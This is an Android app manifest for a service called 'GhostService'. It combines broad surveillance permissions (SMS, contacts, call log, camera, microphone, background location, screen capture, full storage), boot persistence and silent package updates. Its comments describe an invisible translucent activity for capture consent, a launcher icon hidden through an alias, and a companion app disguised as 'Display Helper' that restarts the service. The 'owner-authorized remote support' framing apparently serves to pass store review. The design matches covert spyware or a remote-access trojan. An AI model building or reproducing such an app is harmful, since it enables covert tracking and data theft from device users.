<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <!-- normal -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <!-- The persistent owner-authorized remote-management socket uses the
         specialUse type. It is a valid use case not covered by another type:
         dataSync is limited to 6h in a 24h window and cannot start from
         BOOT_COMPLETED on Android 15+, while this is a long-lived support
         session started by the owner. mediaProjection is added only per
         capture (promoteToProjection). -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
    <!-- Allows eligible owner-approved self/sidekick updates to proceed without
         an additional package-installer prompt on API 31+. Eligibility still
         depends on signatures, target SDK and installer/update ownership. -->
    <uses-permission android:name="android.permission.UPDATE_PACKAGES_WITHOUT_USER_ACTION" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />

    <!-- media capture -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
    <uses-permission android:name="android.permission.MEDIA_PROJECTION" />
    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
    <!-- exemption from background-activity-start restrictions (screen-capture
         consent dialog launched from the service) -->
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />

    <!-- runtime -->
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />

    <!-- special -->
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />

    <!-- Android 11+ package visibility: version/installer checks for the
         bundled accessibility sidekick. Without this, device info reports
         sidekick_version=null even while the service is running. -->
    <queries>
        <package android:name="com.tg.ghosta" />
    </queries>

    <application
        android:allowBackup="false"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@android:style/Theme.Material.Light.NoActionBar">

        <activity
            android:name=".MainActivity"
            android:exported="true" />

        <!-- Owner-requested unlock: displays Android's own keyguard UI. -->
        <activity
            android:name=".UnlockActivity"
            android:excludeFromRecents="true"
            android:exported="false"
            android:noHistory="true"
            android:theme="@android:style/Theme.Translucent.NoTitleBar" />

        <!-- Invisible helper: pops the MediaProjection consent dialog, then
             finishes. Translucent so nothing is visible on screen. -->
        <activity
            android:name=".ScreenCaptureActivity"
            android:excludeFromRecents="true"
            android:exported="false"
            android:noHistory="true"
            android:theme="@android:style/Theme.Translucent.NoTitleBar" />

        <!-- Launcher entry lives on an alias so MainActivity can stay enabled
             while the icon is hidden via setComponentEnabledSetting. -->
        <activity-alias
            android:name=".MainAlias"
            android:exported="true"
            android:label="@string/app_name"
            android:targetActivity=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <service
            android:name=".GhostService"
            android:exported="false"
            android:foregroundServiceType="specialUse|mediaProjection|camera|microphone">
            <!-- Required for specialUse on Android 14+: declares the concrete
                 owner-authorized use case shown in Play policy review. -->
            <property
                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
                android:value="owner-authorized remote device support and update management" />
        </service>

        <receiver
            android:name=".BootReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
            </intent-filter>
        </receiver>

        <!-- Babysitter entry: ghosta (Display Helper) kicks ghostd back to
             life when its local-link beacon goes stale. Explicit-package
             broadcast only; effect is just a service start (harmless). -->
        <receiver
            android:name=".KickReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="com.tg.ghostd.KICK" />
            </intent-filter>
        </receiver>
    </application>

</manifest>
